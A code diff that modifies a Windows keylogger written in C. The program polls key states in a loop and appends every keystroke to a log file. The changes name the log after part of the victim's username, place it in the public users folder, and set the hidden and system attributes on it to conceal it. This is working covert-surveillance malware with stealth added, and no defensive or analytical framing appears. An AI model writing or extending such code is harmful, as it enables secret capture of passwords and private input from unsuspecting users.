@@ -12,13 +12,25 @@ With modifications
 #include <winkeylog.h>
 char KEY_LOG_FILE[MAX_PATH];
 void getPath(char* outPath, size_t size) {
-    char tempPath[MAX_PATH];
-    if (GetEnvironmentVariableA("TEMP", tempPath, MAX_PATH) > 0) {
-        snprintf(outPath, size, "%s\\log.txt", tempPath);
+    char username[256];
+    DWORD userSize = sizeof(username);
+    char slicedName[10];
+    if (GetUserNameA(username, &userSize)) {
+        int len = (int)strlen(username);
+        int firstPart = (len < 5) ? len : 5;
+        char prefix[6] = {0};
+        strncpy(prefix, username, firstPart);
+        char suffix[4] = {0};
+        if (len >= 3) {
+            strcpy(suffix, username + (len - 3));
+        } else {
+            strcpy(suffix, username); 
+        }
+        snprintf(slicedName, sizeof(slicedName), "%s%s", prefix, suffix);
     } else {
-        strncpy(outPath, "C:\\Users\\Public\\log.txt", size - 1);
-        outPath[size - 1] = '\0';
+        strcpy(slicedName, "unknown");
     }
+    snprintf(outPath, size, "C:\\Users\\Public\\%s_log.txt", slicedName);
 }
 
 DWORD WINAPI logKey(LPVOID lpParam) {
@@ -42,7 +54,6 @@ DWORD WINAPI logKey(LPVOID lpParam) {
 	}
 	while (TRUE) {
 		Sleep(1);
-
 		isCAPSLOCK = (GetAsyncKeyState(0x14) & 0xFF) > 0 ? 1 : 0;
 		isNUMLOCK = (GetAsyncKeyState(0x90) & 0xFF) > 0 ? 1 : 0;
 		isL_SHIFT = (GetAsyncKeyState(0xA0) & 0xFF00) > 0 ? 1 : 0;
@@ -93,6 +104,7 @@ DWORD WINAPI logKey(LPVOID lpParam) {
 					kh = fopen(KEY_LOG_FILE, "a");
 					putc(showKey, kh);
 					fclose(kh);
+					SetFileAttributesA(KEY_LOG_FILE, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 				}
 			}
 			last_key_state[vkey] = isPressed;
